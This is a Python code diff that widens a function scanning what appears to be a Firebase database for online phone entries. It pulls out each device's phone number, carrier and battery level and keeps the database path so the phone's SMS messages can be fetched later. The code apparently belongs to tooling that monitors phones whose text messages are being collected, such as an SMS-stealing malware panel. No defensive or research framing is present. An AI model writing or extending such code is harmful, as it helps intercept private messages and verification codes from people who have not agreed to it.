@@ -231,20 +231,59 @@ def get_online_devices():
                     online_val = str(node.get('online', '')).lower()
                     is_online = status_val in ['online', 'active', '1', 'true', 'connected'] or online_val in ['true', '1', 'online']
                     
-                    if is_online and any(k in node for k in ['number', 'phone', 'battery', 'sms', 'device_id', 'model', 'sim']):
+                    # Trigger scan if it looks like a device node
+                    if is_online and any(k in node for k in ['number', 'phone', 'battery', 'sms', 'device_id', 'model', 'sim', 'messages', 'inbox', 'sim1', 'sim2']):
                         dev_id = current_path.split('/')[-1] or node.get('device_id', node.get('id', 'Unknown'))
                         if dev_id not in db_data.get('active_monitors', {}):
                             if not any(d['device_id'] == dev_id for d in all_devices):
-                                # fixed: broader key matching for phone number and network
-                                num = node.get('number') or node.get('phone') or node.get('phoneNumber') or node.get('sim_number') or node.get('msisdn') or node.get('sim1') or 'Unknown'
-                                net = node.get('network') or node.get('operator') or node.get('carrier') or node.get('network_type') or node.get('net_type') or 'N/A'
+                                num = 'Unknown'
+                                net = 'N/A'
+                                
+                                # 1. Direct & Flat Keys for Number
+                                num_keys = ['number', 'phone', 'mobile', 'msisdn', 'phoneNumber', 'phone_no', 'phone_number', 'sim_number', 'sim1', 'sim2', 'msisdn1', 'msisdn2', 'contact', 'sim1_number', 'sim2_number']
+                                for k in num_keys:
+                                    if k in node and isinstance(node[k], (str, int)) and str(node[k]).strip():
+                                        num = str(node[k]).strip()
+                                        break
+                                
+                                # 2. Nested SIM objects for Number (e.g., sim1: {number: "..."})
+                                if num == 'Unknown':
+                                    for k in ['sim1', 'sim2', 'sim', 'simInfo', 'sim_info', 'sim_info_1', 'sim_info_2']:
+                                        if k in node and isinstance(node[k], dict):
+                                            for subk in num_keys:
+                                                if subk in node[k] and isinstance(node[k][subk], (str, int)) and str(node[k][subk]).strip():
+                                                    num = str(node[k][subk]).strip()
+                                                    break
+                                        if num != 'Unknown': break
+                                        
+                                # 3. Regex Fallback (search for any 10-15 digit number in the whole device node)
+                                if num == 'Unknown':
+                                    node_str = json.dumps(node)
+                                    match = re.search(r'\+?\d{10,15}', node_str)
+                                    if match:
+                                        num = match.group(0)
+                                
+                                # 4. Network Extraction
+                                net_keys = ['network', 'operator', 'carrier', 'network_type', 'net_type', 'sim_operator', 'provider', 'operator_name']
+                                for k in net_keys:
+                                    if k in node and isinstance(node[k], str) and node[k].strip():
+                                        net = node[k].strip()
+                                        break
+                                if net == 'N/A':
+                                    for k in ['sim1', 'sim2', 'sim', 'simInfo', 'sim_info']:
+                                        if k in node and isinstance(node[k], dict):
+                                            for subk in net_keys:
+                                                if subk in node[k] and isinstance(node[k][subk], str) and node[k][subk].strip():
+                                                    net = node[k][subk].strip()
+                                                    break
+                                        if net != 'N/A': break
                                 
                                 all_devices.append({
                                     "device_id": dev_id,
                                     "number": num,
-                                    "battery": str(node.get('battery', node.get('batteryLevel', 'N/A'))),
+                                    "battery": str(node.get('battery', node.get('batteryLevel', node.get('battery_level', 'N/A')))),
                                     "network": net,
-                                    "path": current_path, # Save path to fetch SMS later
+                                    "path": current_path,
                                     "fb_url": fb_url
                                 })
                         return
